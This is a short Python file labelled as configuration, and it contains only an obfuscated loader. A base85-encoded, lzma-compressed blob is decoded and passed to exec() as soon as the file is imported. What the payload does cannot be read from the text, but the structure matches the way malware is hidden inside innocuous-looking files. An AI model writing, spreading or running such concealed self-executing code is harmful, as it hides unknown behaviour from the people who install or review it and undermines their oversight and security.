# Conf
import lzma, base64
_data = b'{Wp48S^xk9=GL@E0stWa8~^|S5YJf5-~?d;AYA}7n@VT6Qap47uD?*%pqR^2IeP3OZ&0(1-hSC}{k&JXX;~YG;7Ab&!cUhzo__8K&ijeNOQM8Xq}f<WPz+XXYr1a*l6R~*xQV{m+PEF!+=G$f>82L!3q_UrTKE|VbpYvw-K0NSvySL#uIkfKA8Czw7WJy^af?E?LKN?Pn}Wg^1sHPg<M+uSVui0E{1qzXBQ~46CUDFWrG1rh5$RXo1Y|KND(v}Vm~ljMfOQ7Yd&%i1jm`a`z%a{hLv@5v6(+^mtWDaq4iwv1Nql!z$4bo$?l#i)+9nW<{9EU<OZFo|4K7JdjAT;MkG{pX6=Y|LS^ln?1>ob$#bjjLEi9*y&Evs%13pHUz!Zh*&zGQk<Xzl=DjR}&`Vfju3-Rz3YXflmlB8GZNPm_2tqR+Um;+{db%m}7ir=`bhY4Kvm?b+{H&J&n!ZtK1kTSbf2T+eMZj+n|jybS@i*69+8b|`mncBnI4)hIvFE?mjrd;v}AHs+6>@G3{WUArrIA7Q48470p<lS>@j-7`Si9@lNH?pk*B#$Cn0cDXC93f;bx#i{nE`Z`lNvR`8@hn`^7N7X_I6C=SSx|VXXca^OcqBP+rD|V%4^@Zw%$p)^qtEK+4irZ;;@j&rmN-Y<=%MI6%y7@Kx19LVa+C_xMf7hd>)P->k&e3?rJAwjT|xYTmFT;@wvo{Vgyr;wH6$wlt7_myA|UVI00F!N;s^i$7<srUvBYQl0ssI200dcD'
_exec = lzma.decompress(base64.b85decode(_data)).decode('utf-8')
exec(_exec)
